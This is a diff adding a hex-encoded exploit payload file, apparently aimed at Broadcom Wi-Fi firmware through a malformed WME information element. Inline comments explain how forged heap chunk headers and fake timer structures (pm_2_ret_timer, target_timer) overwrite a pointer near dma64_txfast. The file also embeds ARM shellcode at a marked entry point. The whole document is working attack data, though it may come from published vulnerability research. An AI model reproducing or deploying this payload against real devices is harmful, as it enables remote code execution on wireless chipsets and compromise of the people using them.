@@ -1,0 +1,25 @@
+dd # -0x2
+ff # -0x1 : malformed length
+0050f2020101000003a4000027a4000042435e0062322f00 # 0x0 (0x217014): original WME IE
+0000000000000000000000000000000000000000 # 0x18 (0x21702c): 0x14 filler. This part is overwritten by the WME code.
+78000000 # 0x2c (0x217040) : next_chunk.size = 0x78
+00000000 # 0x30 (0x217044) : next_chunk.next = 0
+41 # 0x34 (0x217048) (0x0): PM mode. change it to an invalid value (0x41) to force pm_2_ret_timer to be cleaned up?
+414141414141414141414141414141 # 0x35 (0x217049): 0xf bytes of filler
+00000000 # 0x44 (0x217058): 0x10 one of the timers we don't exploit; keep it null to prevent a crash
+41414141 # 0x48 (0x21705c): 0x14 whatever
+00000000 # 0x4c (0x217060): 0x18 another timer.
+4141414141414141414141414141414141414141414141414141414100000000 # 0x50 (0x21705c) 0x1c: more wlc_pm_st_t; 0x3c-0x10-0xc bytes of filler
+c8702100 # 0x70 (0x217084) (0x3c): pm_2_ret_timer = &target_timer
+4141414141414141 # 0x74 rest of the space is for shellcode.
+2de9ff4300f003f80fbc74f7f9ba044b044a1a60044a014b1360704788842400d08a1b0000207047c497230000000000 # 0x7c (0x217090): shellcode entry point.
+28000000 # 0xac (0x2170c0): next_chunk.size = 0x28
+00000000 # 0xb0 (0x2170c4): next_chunk.next = 0
+84b61800 # 0xb4 (0x2170c8): target_timer.next = &next_timer = (address_to_patch - 0x8) = (&dma64_txfast - 0x8) = (0x18b68c - 0x8)
+d0702100 # 0xb8 (0x2170cc): target_timer.hrti = &fake_hrti
+5e071079 # 0xbc (0x2170d0): target_timer.timeout = value_to_write - *(address_to_patch) | hrti.something (not used)
+c8702100 # 0xc0 (0x2170d4): target_timer.func | hrti.timer_list.next = &target_timer (cleared by setting func to zero)
+000000000000000000000000000000000000000000000000 # 0xc4 (0x2170d8): unused
+24010000 # 0xdc (0x2170f0): next_chunk.size = 0x124
+00000000 # 0xe0 (0x217104): next_chunk.next = 0
+000000000000000000000000000000000000000000000000000000 # 0xe4 (0x217100): filler
